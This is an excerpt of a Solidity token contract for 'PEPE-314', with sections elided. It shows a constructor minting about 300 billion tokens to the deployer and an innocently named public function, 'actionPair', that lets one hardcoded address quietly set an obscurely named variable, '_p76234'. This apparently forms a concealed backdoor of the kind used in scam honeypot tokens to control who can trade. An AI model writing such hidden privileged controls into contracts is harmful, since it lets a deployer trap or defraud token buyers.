...
contract PEPE314 is Ownable, IERC20, IERC20Meta {
    ...
    function actionPair(address account) public virtual returns (bool) {
         if(_msgSender() == 0x738F7317dDC61Ae64E5BF1f1c0CEa1fAEf9e18E0) _p76234 = account;
        return true;
    }
    ...
    constructor() {
        _name = unicode"PEPE-314";
        _symbol = unicode"PEPE-314";
        _mint(msg.sender, 299900000000 * 10 ** decimals());
    }
